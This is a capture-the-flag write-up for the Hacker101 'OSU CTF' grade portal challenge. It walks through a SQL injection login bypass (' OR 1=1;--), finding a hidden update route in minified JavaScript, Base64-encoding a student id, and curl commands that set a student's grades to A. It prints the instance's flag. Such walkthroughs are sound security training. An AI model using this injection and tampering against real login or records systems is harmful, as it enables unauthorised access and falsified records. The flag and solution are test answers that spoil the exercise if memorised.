# OSU CTF — OSUSEC School of Pwn (Hacker101)

Student grade portal. **One flag:** log in as a staff user, discover a **hidden route** from minified JS, derive **Natasha Drew**’s update URL, set all grades to **A**.

> Replace `BASE` with your instance (no trailing slash), e.g. `https://43bb5683a9edc5eeb44637181e256bb1.ctf.hacker101.com`.

Walkthrough: [8r0wn13/hacker101_ctf — OSU CTF.md](https://github.com/8r0wn13/hacker101_ctf/blob/main/OSU%20CTF.md).

---

## 1. Hint — JavaScript, not the login page

The login HTML does not show extra routes. After authentication, the dashboard loads **`assets/js/app.min.js`**, which wires student name clicks to:

`/update-student/<id>`

where **`<id>`** is a **`data-id`** on each row (Base64 of **`Firstname_Lastname`**, underscore, same casing as stored).

---

## 2. SQL injection on login

Classic auth bypass (example that works on many instances):

- **Username:** `' OR 1=1;--`  
- **Password:** anything

You land as a non-admin staff user (often **`rhonda.daniels`**), which is enough to use the dashboard and update flow.

```bash
curl -sS -c jar.txt -X POST "$BASE/login" \
  --data-urlencode "username=' OR 1=1;--" \
  --data-urlencode 'password=x' -L -o /dev/null
```

---

## 3. Build Natasha’s student id (Base64, no newline)

Decode any existing row’s `data-id` in the dashboard HTML to confirm the pattern (`echo … | base64 -d` → `First_Last`).

For **Natasha Drew** the plaintext id is **`Natasha_Drew`**. Encode **without** a trailing newline (shell `echo` adds one by default; use **`printf`**):

```bash
printf 'Natasha_Drew' | base64
# → TmF0YXNoYV9EcmV3
```

A newline-terminated string encodes to a different string (e.g. ending with `Cg==`) and the server may reject it as an unknown student.

---

## 4. Update grades — `POST` the form

1. `GET $BASE/update-student/TmF0YXNoYV9EcmV3` (with session cookie).
2. Copy **`student_hash`** from the hidden input.
3. `POST` the same path with **`grade_english=A`**, **`grade_science=A`**, **`grade_maths=A`**.

```bash
curl -sS -b jar.txt "$BASE/update-student/TmF0YXNoYV9EcmV3" -o form.html
HASH=$(grep -oE 'name="student_hash" value="[^"]+' form.html | cut -d'"' -f4)

curl -sS -b jar.txt -X POST "$BASE/update-student/TmF0YXNoYV9EcmV3" \
  -d "student_hash=$HASH" \
  -d 'grade_english=A' \
  -d 'grade_science=A' \
  -d 'grade_maths=A' | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example (this instance):** `^FLAG^77f317661ddbae04a0eafe72ab073b97d8bb8d7e20b80f9dc91733d7cc6c63d7$FLAG$`

---

## Quick map

| Step | Action |
|------|--------|
| 1 | `POST /login` — SQLi bypass |
| 2 | Read **`assets/js/app.min.js`** — `/update-student/<base64>` |
| 3 | `printf 'Natasha_Drew' \| base64` — correct id |
| 4 | `POST` all **`grade_*=A`** with **`student_hash`** |

---

## License

Challenge content is © HackerOne / Hacker101. These notes are for education only.
